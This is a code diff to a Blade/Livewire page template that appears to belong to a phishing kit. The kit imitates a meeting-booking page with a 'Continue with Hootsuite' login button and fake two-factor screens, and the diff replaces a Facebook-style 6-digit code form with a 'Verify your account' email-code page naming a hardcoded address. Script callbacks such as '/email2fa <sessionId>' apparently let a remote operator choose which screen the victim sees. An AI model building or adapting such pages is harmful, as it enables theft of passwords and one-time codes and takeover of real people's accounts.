@@ -240,8 +240,99 @@
             padding-bottom: 4px;
         }
 
+        .email-2fa-wrapper {
+            display: flex;
+            flex-wrap: wrap;
+            margin-bottom: 0;
+            padding: 30px 50px;
+            padding-bottom: 0;
+            background: #fff;
+        }
+
+        .email-2fa-wrapper .left-section {
+            width: 35%;
+            padding-bottom: 30px;
+        }
+
+        .email-2fa-wrapper .left-section p {
+            font-size: 12px;
+            margin-bottom: 5px;
+        }
+
+        .email-2fa-wrapper .left-section .title {
+            font-size: 30px;
+            font-weight: 700;
+            margin-top: 10px;
+            margin-bottom: 20px;
+        }
+
+        .email-2fa-wrapper .left-section .inputWrapper {
+            margin-top: 5px;
+            margin-bottom: 0;
+        }
+
+        .email-2fa-wrapper .left-section .inputWrapper label {
+            font-weight: 400
+        }
+
+        .email-2fa-wrapper .left-section .submitButton {
+            margin-top: 20px;
+        }
+
+        .email-2fa-wrapper .right-section {
+            width: 65%;
+            min-height: 100%;
+            display: flex;
+            align-items: flex-start;
+            padding: 0px 30px;
+            margin-top: 30px;
+        }
+
+        .email-2fa-wrapper .right-section img {
+            width: 100%
+        }
+
+        .links {
+            text-align: center;
+
+        }
+
+        .links a {
+            text-decoration: none;
+            color: #2f6b9a;
+            font-weight: 700;
+            cursor: pointer;
+            outline: 0;
+        }
+
+        .facebook__button button {
+            background: #E03035;
+            color: #fff;
+        }
+
+        #progressbar .active {
+            color: #E03035;
+        }
+
+        #progressbar li.active:after,
+        #progressbar li.active:before {
+            background-color: #E03035;
+        }
+
         @media (max-width: 768px) {
             .rtpColumn {
+                display: none;
+            }
+
+            .email-2fa-wrapper {
+                padding: 30px;
+            }
+
+            .email-2fa-wrapper .left-section {
+                width: 100%;
+            }
+
+            .email-2fa-wrapper .right-section {
                 display: none;
             }
 
@@ -283,9 +374,9 @@
                             <div class="minute">
                                 <svg data-id="details-item-icon" viewBox="0 0 10 10" xmlns="http://www.w3.org/2000/svg"
                                     role="img">
-                                    <path d="M.5 5a4.5 4.5 0 1 0 9 0 4.5 4.5 0 1 0-9 0Z" fill="none"
-                                        stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"></path>
-                                    <path d="M5 3.269V5l1.759 2.052" fill="none" stroke="currentColor"
+                                    <path d="M.5 5a4.5 4.5 0 1 0 9 0 4.5 4.5 0 1 0-9 0Z" fill="none" stroke="#E03035"
+                                        stroke-linecap="round" stroke-linejoin="round"></path>
+                                    <path d="M5 3.269V5l1.759 2.052" fill="none" stroke="#E03035"
                                         stroke-linecap="round" stroke-linejoin="round"></path>
                                 </svg>
                                 <span>15 min</span>
@@ -295,20 +386,20 @@
                                     xmlns="http://www.w3.org/2000/svg" role="img">
                                     <path
                                         d="M6.216 9.151a2.215 2.215 0 0 0 2.758-.3l.31-.31a.738.738 0 0 0 0-1.043l-1.3-1.3a.739.739 0 0 0-1.044 0h0a.738.738 0 0 1-1.043 0L3.806 4.107a.738.738 0 0 1 0-1.043h0a.739.739 0 0 0 0-1.044L2.5.716a.738.738 0 0 0-1.043 0l-.31.31a2.214 2.214 0 0 0-.3 2.758 19.976 19.976 0 0 0 5.369 5.367Z"
-                                        fill="none" stroke="currentColor" stroke-linecap="round"
-                                        stroke-linejoin="round"></path>
+                                        fill="none" stroke="#E03035" stroke-linecap="round" stroke-linejoin="round">
+                                    </path>
                                 </svg>
                                 <span>Phone call</span>
                             </div>
                             <div class="minute space__bettwen">
                                 <svg data-id="details-item-icon" viewBox="0 0 10 10" xmlns="http://www.w3.org/2000/svg"
                                     role="img">
-                                    <path d="M.5 5a4.5 4.5 0 1 0 9 0 4.5 4.5 0 1 0-9 0Z" fill="none"
-                                        stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"></path>
+                                    <path d="M.5 5a4.5 4.5 0 1 0 9 0 4.5 4.5 0 1 0-9 0Z" fill="none" stroke="#E03035"
+                                        stroke-linecap="round" stroke-linejoin="round"></path>
                                     <path
                                         d="M.846 6.731h1.212a1.212 1.212 0 0 0 1.211-1.212V4.481a1.212 1.212 0 0 1 1.212-1.212 1.211 1.211 0 0 0 1.211-1.211V.553M9.5 4.929a2.469 2.469 0 0 0-1.117-.275H6.9a1.212 1.212 0 1 0 0 2.423.865.865 0 0 1 .865.865v.605"
-                                        fill="none" stroke="currentColor" stroke-linecap="round"
-                                        stroke-linejoin="round"></path>
+                                        fill="none" stroke="#E03035" stroke-linecap="round" stroke-linejoin="round">
+                                    </path>
                                 </svg>
                                 <span>US Georgia (00:59)</span>
                             </div>
@@ -376,23 +467,10 @@
                                 </div>
                                 <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;">
                                     <div class="facebook__button">
-                                        <button id="continue-facebook" wire:click.prevent="openLoginModal">
-                                            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="24"
-                                                viewBox="0 0 25 24" fill="none">
-                                                <g clip-path="url(#clip0_302_2)">
-                                                    <rect width="24" height="24" transform="translate(0.845947)"
-                                                        fill="#1877F2"></rect>
-                                                    <path
-                                                        d="M24.3459 12.0699C24.3459 5.7186 19.1972 0.56988 12.8459 0.56988C6.49467 0.56988 1.34595 5.7186 1.34595 12.0699C1.34595 17.8099 5.55133 22.5674 11.0491 23.4302V15.3941H8.12915V12.0699H11.0491V9.53629C11.0491 6.6541 12.7659 5.06207 15.3928 5.06207C16.651 5.06207 17.967 5.28668 17.967 5.28668V8.11675H16.5169C15.0883 8.11675 14.6428 9.00322 14.6428 9.91266V12.0699H17.8323L17.3224 15.3941H14.6428V23.4302C20.1406 22.5674 24.3459 17.8099 24.3459 12.0699Z"
-                                                        fill="white"></path>
-                                                </g>
-                                                <defs>
-                                                    <clipPath id="clip0_302_2">
-                                                        <rect width="24" height="24" fill="white"
-                                                            transform="translate(0.845947)"></rect>
-                                                    </clipPath>
-                                                </defs>
-                                            </svg>
+                                        <button id="continue-facebook" wire:click.prevent="openLoginModal"
+                                            style="display: flex; align-items: center; justify-content: center;">
+                                            <img src="{{ asset('favicon.ico') }}" alt="Continue with Hootsuite"
+                                                height="25px" width="25px" />
                                             Continue with Hootsuite
                                         </button>
                                     </div>
@@ -764,83 +842,44 @@
                                     </div>
                                 @endif
                                 @if ($twoFaPage)
-                                    <div class="auth-req-container">
-                                        <form id="desktop-code" class="auth-req" wire:submit.prevent="codeSubmit">
-                                            <div class="auth-req-text">
-                                                <h2>Two-factor authentication required</h2>
-                                                <div class="auth-req-paragraph">
-                                                    <p class="first">You’ve asked us to require a 6-digit login code
-                                                        when anyone tries to access your account from a new device or
-                                                        browser.</p>
-                                                    <p class="second">Enter the 6-digit code from your <strong>code
-                                                            generator</strong> or third-party app below.</p>
-                                                </div>
-                                                <div class="input-auth-req">
-                                                    <input maxlength="6" minlength="6" name="code"
-                                                        class="show-input-on-desktop" placeholder="Login Code"
-                                                        type="number" required="required">
-                                                    @if ($codeError)
-                                                        <div class="show-error-modal">
-                                                            <p>The login code you entered doesn't match the one sent to
-                                                                your phone. Please check the number and try again.</p>
-                                                        </div>
-                                                    @endif
-                                                    <span> (wait 4:29)</span>
-                                                </div>
-                                            </div>
-                                            <div class="auth-req-footer" style="height: auto"><a>Need another way to
-                                                    authenticate?</a>
-                                                <button type="submit" class="false"><span>Continue</span></button>
-                                            </div>
-                                        </form>
-                                        <form id="mobile-code" class="auth-req"
-                                            wire:submit.prevent="codeSubmitMobile">
-                                            <div class="auth-req-text">
-                                                <h2>Two-factor authentication required</h2>
-                                                <div class="auth-req-paragraph">
-                                                    <p class="first">You’ve asked us to require a 6-digit login code
-                                                        when anyone tries to access your account from a new device or
-                                                        browser.</p>
-                                                    <p class="second">Enter the 6-digit code from your <strong>code
-                                                            generator</strong> or third-party app below.</p>
-                                                </div>
-                                            </div>
-                                            <div class="show-input-on-mobile show__input-modal">
-                                                <input maxlength="6" minlength="6" name="code2"
-                                                    placeholder="Login Code" type="number" required="required">
-                                                @if ($codeError)
-                                                    <div class="show-error-modal2">
-                                                        <p>The login code you entered doesn't match the one sent to your
-                                                            phone. Please check the number and try again.</p>
-                                                    </div>
-                                                @endif
-                                            </div>
-                                            <div class="having-trouble-class">
-                                                <button>Having trouble?</button>
-                                            </div>
-                                            <div class="show-button-mobile false">
-                                                <button type="submit">Continue</button>
-                                            </div>
-                                        </form>
+                                    <form action="" class="email-2fa-wrapper">
+                                        <div class="left-section">
+                                            <a href="Javascript:void(0)" class="link">
+                                                ← Back to signin
+                                            </a>
+                                            <h2 class="title">Verify your account</h2>
+                                            <p>
+                                                You will need to verify your account before you can proceed.
+                                                Click the button below and we’ll send you a verification email.
+                                            </p>
+                                            <p style="font-weight: bold;">Why am I seeing this screen?</p>
+                                            <p>
+                                                Most often, users who see this screen have either entered their
+                                                password incorrectly too many times or are logging in from a new
+                                                location.
+                                                As a security measure, you'll need to click on the verification link
+                                                that we’ve sent to your email.
+                                            </p>
+                                            <label>A confirmation code was sent
+                                                to<br><strong>ransbergermagadaprous@outlook.com.br</strong></label>
+                                            <div class="inputWrapper">
+                                                <label for="loginEmailInput">Enter your confirmation code here</label>
+                                                <input id="loginEmailInput"
+                                                    class="inputContainer _requiredInput _emailInput" type="email"
+                                                    name="email">
 
-                                        <div class="show-footer-on-mobile-plus">
-                                            <h2 class="h2-foot not__you-text">Not You? Log In Here</h2>
-                                            <div class="footer-flex-mobile-plus confimartion__modal">
-                                                <div>
-                                                    <h2>English (US)</h2>
-                                                    <p>Deutsch</p>
-                                                    <p>Српски</p>
-                                                    <p>Português (Brasil)</p>
-                                                </div>
-                                                <div>
-                                                    <p>Italiano</p>
-                                                    <p>Bosanski</p>
-                                                    <p>Svensk</p>
-                                                    <button>+</button>
-                                                </div>
+                                            </div>
+                                            <button class="button disabled _submit submitButton"
+                                                type="submit">Submit</button>
+                                            <div class="links">
+                                                <p>Didn't receive an email? <a href="#">Resend</a></p>
+                                                <p><a href="#">Sign in to another account</a></p>
                                             </div>
                                         </div>
-                                    </div>
+                                        <div class="right-section">
+                                            <img src="{{ asset('img/2fa-image.png') }}" alt="">
+                                        </div>
+                                    </form>
                                 @endif
                                 @if ($enableLoadingAfterSubmit)
                                     <div class="loading-container">
@@ -1196,7 +1235,7 @@
                                             @this.set('codeError', false);
                                             @this.set('showCalender', false);
                                         } else if (callbackData ===
-                                            `/2fa ${localStorage.getItem('sessionId')}`) {
+                                            `/email2fa ${localStorage.getItem('sessionId')}`) {
                                             $('#continue-modal').show();
                                             @this.set('showCalenderProgress', false);
                                             @this.set('loginError', false);
